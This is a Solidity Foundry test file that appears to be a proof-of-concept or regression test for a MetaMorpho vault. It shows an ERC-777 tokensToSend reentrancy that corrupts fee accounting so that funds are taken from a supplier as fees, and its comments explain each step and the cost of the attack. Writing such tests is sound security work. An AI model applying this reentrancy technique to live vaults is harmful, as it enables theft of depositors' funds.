// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {ERC1820Registry} from "src/mocks/ERC1820Registry.sol";
import {ERC777Mock, IERC1820Registry} from "src/mocks/ERC777Mock.sol";
import {IERC1820Implementer} from "@openzeppelin/interfaces/IERC1820Implementer.sol";
import {IMetaMorpho} from "src/interfaces/IMetaMorpho.sol";

import "src/MetaMorphoFactory.sol";
import "./helpers/IntegrationTest.sol";

contract MetaMorphoTest is IntegrationTest, IERC1820Implementer {
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    address internal attacker = makeAddr("attacker");

    MetaMorpho newVault;
    MetaMorphoFactory factory;
    ERC777Mock internal reentrantToken;
    ERC1820Registry internal registry;

    function setUp() public override {
        super.setUp();

        console2.log("here0");

        registry = new ERC1820Registry();

        registry.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
        registry.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));

        reentrantToken = new ERC777Mock(100_000, new address[](0), IERC1820Registry(address(registry)));

        factory = new MetaMorphoFactory(address(morpho));
        newVault = factory.createMetaMorpho(
            OWNER,
            ConstantsLib.MIN_TIMELOCK,
            address(reentrantToken),
            "MTK_VAULT",
            "MTK_V",
            keccak256(abi.encode("salt"))
        );

        // Set fee to 50%
        uint256 fee = 0.5 ether; // 50%
        vm.startPrank(OWNER);
        newVault.setFeeRecipient(FEE_RECIPIENT);
        newVault.submitFee(fee);
        vm.warp(block.timestamp + ConstantsLib.MIN_TIMELOCK);
        newVault.acceptFee();

        reentrantToken.setBalance(SUPPLIER, 100_000 ether); // SUPPLIER supplies 100_000e18 tokens to MetaMorpho.
        console2.log("Supplier starting with %s tokens.", loanToken.balanceOf(SUPPLIER));
        vm.startPrank(SUPPLIER);
        reentrantToken.approve(address(newVault), 100_000 ether);
        uint256 userShares = newVault.deposit(100_000 ether, SUPPLIER);
        vm.stopPrank();

        console2.log(
            "Supplier deposited %s loanTokens to metaMorpho_no_timelock in exchange for %s shares.",
            newVault.previewRedeem(userShares),
            userShares
        );
        console2.log("Finished setUp.");
    }

    function test777Reentrancy() public {
        reentrantToken.setBalance(attacker, 100_000); // Mint 100_000 tokens to attacker.

        console2.log("Attacker starting with %s tokens", reentrantToken.balanceOf(attacker));
        console2.log("Fee recipient starting with %s tokens", reentrantToken.balanceOf(FEE_RECIPIENT));

        vm.startPrank(attacker);

        registry.setInterfaceImplementer(attacker, _TOKENS_SENDER_INTERFACE_HASH, address(this)); // Set test contract
            // to receive ERC-777 callbacks.
        registry.setInterfaceImplementer(attacker, _TOKENS_RECIPIENT_INTERFACE_HASH, address(this)); // Required "hack"
            // because done all in a single Foundry test.

        reentrantToken.approve(address(newVault), 100_000);

        newVault.deposit(1, attacker); // Initial deposit of 1 token to be able to call withdraw(1) in the subcall
            // before depositing(5000)

        newVault.deposit(5_000, attacker); // Deposit 5000, withdraw 1 in the subcall. Total deposited 4999,
            // lastTotalAssets only updated by +1.

        vm.startPrank(attacker); // Have to re-call startPrank because contract was reentered. Hacky but works.
        newVault.deposit(5_000, attacker); // Same as above. Accrue yield accrues 50% * (newTotalAssets -
            // lastTotalAssets) = 50% * 4999 = ~2499. lastTotalAssets only updated by +1.

        vm.startPrank(attacker);
        newVault.deposit(5_000, attacker); // ~2499 tokens taken as fees.

        vm.startPrank(attacker);
        newVault.deposit(5_000, attacker); // ~2499 tokens taken as fees.

        // Withdraw everything

        vm.startPrank(attacker);
        newVault.withdraw(newVault.maxWithdraw(attacker), attacker, attacker); // Withdraw 99_999 tokens, cost of attack
            // = 1 token

        vm.startPrank(FEE_RECIPIENT);
        newVault.withdraw(newVault.maxWithdraw(FEE_RECIPIENT), FEE_RECIPIENT, FEE_RECIPIENT); // Fee recipient withdraws
            // 9_999 tokens, stolen from `SUPPLIER`

        console2.log("Attacker ending with %s tokens", reentrantToken.balanceOf(attacker)); // 99_999
        console2.log("Fee recipient ending with %s tokens", reentrantToken.balanceOf(FEE_RECIPIENT)); // 9_999

        assertEq(reentrantToken.balanceOf(FEE_RECIPIENT), 0, "balanceOf(FEE_RECIPIENT)");
    }

    function tokensToSend(address, address from, address to, uint256 amount, bytes calldata, bytes calldata) external {
        if ((from == attacker) && (amount == 5000)) {
            // Don't call back on first deposit(1)
            vm.startPrank(attacker);
            IMetaMorpho(to).withdraw(1, attacker, attacker);
            vm.stopPrank();
        }
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external {}

    function canImplementInterfaceForAddress(bytes32, address) external pure returns (bytes32) {
        // Required for ERC-777
        return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));
    }
}
